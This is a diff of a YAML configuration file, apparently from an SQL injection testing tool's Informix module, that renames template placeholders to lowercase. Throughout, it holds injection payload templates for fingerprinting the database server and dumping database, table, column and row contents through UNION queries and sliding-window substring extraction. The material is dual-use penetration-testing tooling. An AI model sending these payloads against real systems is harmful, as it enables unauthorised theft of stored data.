@@ -3,11 +3,11 @@ resource:
  info: |
   SELECT trim(
       DBINFO('version','full')
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || DBSERVERNAME
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || USER
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
   ) r 
   FROM TABLE(SET{1})
   
@@ -15,107 +15,107 @@ resource:
   database: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from 
            (select distinct name from sysdatabases) t,
            (select distinct name from sysdatabases) t1
        where t.name >= t1.name
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       ||'${TRAIL_SQL}' 
+       ||'${trail_sql}' 
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.tabname)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from 
-           (select distinct tabname from ${DATABASE}:systables) t,
-           (select distinct tabname from ${DATABASE}:systables) t1
+           (select distinct tabname from ${database}:systables) t,
+           (select distinct tabname from ${database}:systables) t1
        where t.tabname >= t1.tabname
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || trim(t.colname)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from 
-           (select distinct colname from ${DATABASE}:syscolumns c join ${DATABASE}:systables t on c.tabid = t.tabid where tabname = '${TABLE}') t,
-           (select distinct colname from ${DATABASE}:syscolumns c join ${DATABASE}:systables t on c.tabid = t.tabid where tabname = '${TABLE}') t1
+           (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t,
+           (select distinct colname from ${database}:syscolumns c join ${database}:systables t on c.tabid = t.tabid where tabname = '${table}') t1
        where t.colname >= t1.colname
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        || '${TRAIL_SQL}' 
+        || '${trail_sql}' 
         r
     from (
         select
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             || trim(t.s)
-            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            || '${separator_qte_sql}0${enclose_value_sql}'
             rr
         from
-           (select distinct ${FIELDS} s from ${DATABASE}:${TABLE}) t,
-           (select distinct ${FIELDS} s from ${DATABASE}:${TABLE}) t1
+           (select distinct ${fields} s from ${database}:${table}) t,
+           (select distinct ${fields} s from ${database}:${table}) t1
         where t.s >= t1.s
         group by 1
-        {limit}
+        ${limit}
     ) a
    fields: 
-    field: trim(nvl(${FIELD}, ''))
+    field: trim(nvl(${field}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
  configuration: 
   slidingWindow: |
    select
-       '${LEAD}'
+       '${lead}'
        ||substr(
            r,
-           ${INDEX},
+           ${index},
            32767
        ) r 
    from (
-       ${INJECTION}
+       ${injection}
    ) x
-  limit: having count(*) between ${LIMIT} and ${LIMIT}
+  limit: having count(*) between ${limit.value} and ${limit.value}
   failsafe: |
    select 
-       (1337${INDICE}7330%2b1) 
+       (1337${indice}7330%2b1) 
        || '' r 
    FROM TABLE(SET{1})
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    )
   limitBoundary: 1
   endingComment: --+-
@@ -126,6 +126,6 @@ strategy:
     - Informix database
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE}) b
-  capacity: "'${LEAD}${INDICE}' || ${CALIBRATOR}"
+  indices: union select ${result_range} from (${indice_unique}) b
+  capacity: "'${lead}${indice}' || ${calibrator}"
   orderBy: order by 1337
